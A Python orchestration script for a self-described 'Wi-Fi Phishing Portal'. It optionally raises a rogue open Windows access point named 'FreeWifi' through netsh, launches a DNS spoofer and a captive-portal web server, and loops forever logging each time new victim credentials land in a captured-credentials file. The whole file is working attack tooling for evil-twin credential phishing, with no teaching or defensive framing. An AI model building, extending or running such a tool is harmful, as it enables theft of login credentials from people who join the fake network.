"""
Main script to orchestrate the Wi-Fi phishing portal components.

Starts the Wi-Fi AP (optional, Windows-specific), DNS spoofer,
captive portal web server, and monitors for captured credentials.
"""
import subprocess
import threading
import time
import os
import json
import logging
import sys

# --- Logging Setup ---
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.StreamHandler(sys.stdout)])
# --- ---

CONFIG_PATH = os.path.join(os.path.dirname(__file__), 'config.json')
CRED_DIR = os.path.join(os.path.dirname(__file__), 'login_details')
CRED_FILE = os.path.join(CRED_DIR, 'captured_credentials.enc')

def start_wifi_ap(ssid, password):
    """
    Starts a Wi-Fi Hosted Network on Windows using netsh.

    Note: This function is Windows-specific.

    Args:
        ssid (str): The desired SSID for the network.
        password (str, optional): The password for the network. If None or empty,
                                  an open network might be created (depending on OS).
    Raises:
        subprocess.CalledProcessError: If a netsh command fails.
        FileNotFoundError: If netsh command is not found.
    """
    logging.info("Attempting to start Wi-Fi AP (Windows specific)...")
    try:
        # Stop any existing hosted network first
        subprocess.run(['netsh', 'wlan', 'stop', 'hostednetwork'], capture_output=True, check=False)
    except FileNotFoundError:
        logging.error("`netsh` command not found. Cannot manage Wi-Fi AP. Ensure you are on Windows and netsh is in PATH.")
        raise
    except Exception as e:
        logging.warning(f"Could not stop existing hosted network (might be okay): {e}")

    try:
        cmd_set = ['netsh', 'wlan', 'set', 'hostednetwork', f'ssid={ssid}', 'mode=allow']
        if password:
            cmd_set.append(f'key={password}')
        else:
            logging.warning("No password provided for Wi-Fi AP. Creating an open network.")
            # For an open network, explicitly remove the key if it was previously set
            cmd_set.append('keyUsage=persistent') # Reset key setting

        subprocess.run(cmd_set, check=True, capture_output=True)
        subprocess.run(['netsh', 'wlan', 'start', 'hostednetwork'], check=True, capture_output=True)
        logging.info(f"Wi-Fi AP '{ssid}' started successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to set/start Wi-Fi AP using netsh: {e}")
        logging.error(f"Netsh stdout: {e.stdout.decode(errors='ignore')}")
        logging.error(f"Netsh stderr: {e.stderr.decode(errors='ignore')}")
        raise
    except FileNotFoundError:
        # Already caught above, but handle defensively
        logging.error("`netsh` command not found. Cannot manage Wi-Fi AP.")
        raise

def start_dns_server():
    """Starts the DNS spoofing server in a separate daemon thread."""
    def run_dns():
        """Target function for the DNS server thread."""
        logging.info("DNS server thread started.")
        try:
            # Use sys.executable to ensure the correct Python interpreter is used
            # Run dns_spoofer.py from the directory where main.py is located
            process = subprocess.run([sys.executable, 'dns_spoofer.py'], check=True, cwd=os.path.dirname(__file__))
            logging.info(f"DNS server process finished with code {process.returncode}.")
        except subprocess.CalledProcessError as e:
            logging.error(f"DNS server process failed: {e}")
        except FileNotFoundError:
            logging.error(f"Could not find dns_spoofer.py or python interpreter '{sys.executable}'.")
        except Exception as e:
            logging.error(f"Unexpected error in DNS server thread: {e}")

    # Daemon threads exit automatically when the main program exits
    t = threading.Thread(target=run_dns, name="DNSServerThread", daemon=True)
    t.start()
    logging.info("DNS spoofing server thread launched.")
    return t

def start_captive_portal():
    """Starts the captive portal Flask web server in a separate daemon thread."""
    def run_portal():
        """Target function for the captive portal thread."""
        logging.info("Captive portal thread started.")
        portal_script = os.path.join('portal', 'app.py')
        try:
            # Use sys.executable to ensure the correct Python interpreter is used
            process = subprocess.run([sys.executable, portal_script], check=True, cwd=os.path.dirname(__file__)) # Run from script dir
            logging.info(f"Captive portal process finished with code {process.returncode}.")
        except subprocess.CalledProcessError as e:
            logging.error(f"Captive portal process failed: {e}")
        except FileNotFoundError:
            logging.error(f"Could not find {portal_script} or python interpreter '{sys.executable}'.")
        except Exception as e:
            logging.error(f"Unexpected error in captive portal thread: {e}")

    # Daemon threads exit automatically when the main program exits
    t = threading.Thread(target=run_portal, name="CaptivePortalThread", daemon=True)
    t.start()
    logging.info("Captive portal thread launched.")
    return t

def monitor_credential_file():
    """
    Monitors the credential file for changes in size and logs when new
    credentials appear to have been added. Runs indefinitely.
    """
    logging.info(f"Starting credential file monitor for: {CRED_FILE}")
    last_size = 0
    # Check if file exists initially and get size
    try:
        if os.path.exists(CRED_FILE):
            last_size = os.path.getsize(CRED_FILE)
            logging.info(f"Initial credential file size: {last_size} bytes.")
        else:
            logging.info("Credential file does not exist yet.")
    except OSError as e:
        logging.error(f"Error accessing credential file initially: {e}")
        # Decide if this is fatal or if we should continue monitoring
        # For now, continue monitoring

    while True:
        try:
            if os.path.exists(CRED_FILE):
                try:
                    current_size = os.path.getsize(CRED_FILE)
                    if current_size > last_size:
                        logging.info("New credentials captured (file size increased).")
                        last_size = current_size
                    elif current_size < last_size:
                        logging.warning("Credential file size decreased. File might have been reset or tampered with.")
                        last_size = current_size
                except FileNotFoundError:
                    # File might have been deleted between os.path.exists and os.path.getsize
                    logging.warning("Credential file disappeared unexpectedly.")
                    last_size = 0
                except OSError as e:
                    logging.error(f"Error getting size of credential file: {e}")
            else:
                # If file existed before but now doesn't
                if last_size > 0:
                    logging.warning("Credential file no longer exists.")
                last_size = 0 # Reset size if file doesn't exist

        except Exception as e:
            # Catch-all for unexpected errors during monitoring loop
            logging.error(f"Unexpected error in credential monitor: {e}")

        time.sleep(10) # Check every 10 seconds

def main():
    """Main function to load config and start services."""
    logging.info("Starting Wi-Fi Phishing Portal orchestrator...")

    # --- Load Configuration ---
    config = None
    if not os.path.exists(CONFIG_PATH):
        logging.error(f"Configuration file not found: {CONFIG_PATH}")
        sys.exit(1)
    try:
        with open(CONFIG_PATH, 'r') as f:
            config = json.load(f)
        logging.info("Configuration loaded successfully.")
    except FileNotFoundError: # Should be caught by os.path.exists, but defensive
        logging.error(f"Configuration file not found: {CONFIG_PATH}")
        sys.exit(1)
    except json.JSONDecodeError as e:
        logging.error(f"Error decoding configuration file {CONFIG_PATH}: {e}")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Unexpected error loading configuration: {e}")
        sys.exit(1)

    # --- Ensure credential directory exists ---
    try:
        os.makedirs(CRED_DIR, exist_ok=True)
        logging.info(f"Ensured credential directory exists: {CRED_DIR}")
    except OSError as e:
        logging.error(f"Could not create credential directory {CRED_DIR}: {e}")
        # Decide if this is fatal. For now, let monitor handle file existence.

    # --- Start Wi-Fi AP (Optional, Windows Only) ---
    # Note: This section remains commented out as per original code,
    # but with improved error handling if uncommented.
    # It requires administrative privileges and is Windows-specific.
    # Uncomment carefully and ensure you understand the implications.
    # try:
    #     ssid = config.get('ssid', 'FreeWifi') # Use default if not in config
    #     password = config.get('wifi_password') # Optional password
    #     start_wifi_ap(ssid, password)
    # except KeyError as e:
    #     logging.error(f"Missing required configuration key for Wi-Fi AP: {e}")
    # except (subprocess.CalledProcessError, FileNotFoundError, Exception) as e:
    #     logging.error(f"Failed to start Wi-Fi AP: {e}")
    #     # Consider if this should be fatal depending on requirements
    #     # sys.exit(1)

    # --- Start Core Services ---
    dns_thread = start_dns_server()
    portal_thread = start_captive_portal()

    # --- Start Monitoring ---
    # Run monitor in the main thread, blocking it indefinitely
    monitor_credential_file()

    # --- Cleanup (won't be reached due to monitor loop) ---
    # If monitor_credential_file were designed to exit, cleanup would go here.
    # For daemon threads, cleanup isn't strictly necessary as they exit with main.
    logging.info("Main function finished (should not happen with infinite monitor).")

if __name__ == '__main__':
    main()
